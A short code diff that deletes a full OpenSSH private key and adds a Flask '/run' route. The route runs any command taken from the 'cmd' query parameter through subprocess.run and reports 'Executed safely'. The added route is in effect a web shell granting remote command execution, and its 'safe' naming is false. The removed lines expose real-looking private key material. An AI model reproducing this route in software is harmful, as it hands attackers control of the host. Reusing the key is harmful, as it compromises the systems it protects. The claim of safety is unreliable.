@@ -1,7 +1,8 @@
------BEGIN OPENSSH PRIVATE KEY-----
-b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
-QyNTUxOQAAACCXUw9tQ6nXYA8rbRKokEceZ7dPBiyxNqbkROYaBxHfjgAAAJjFZI6QxWSO
-kAAAAAtzc2gtZWQyNTUxOQAAACCXUw9tQ6nXYA8rbRKokEceZ7dPBiyxNqbkROYaBxHfjg
-AAAECS6LFOeuU4DDA8GhW6bH+Te2TGtW+ljxxR/ipB7yp/5JdTD21DqddgDyttEqiQRx5n
-t08GLLE2puRE5hoHEd+OAAAAEG11aGJmYkB1bW0uYWMuaWQBAgMEBQ==
------END OPENSSH PRIVATE KEY-----
+import shlex, subprocess
+
+@app.route('/run')
+def run_shell_safe():
+    cmd = request.args.get('cmd')
+    args = shlex.split(cmd)
+    subprocess.run(args, check=True)
+    return "Executed safely"
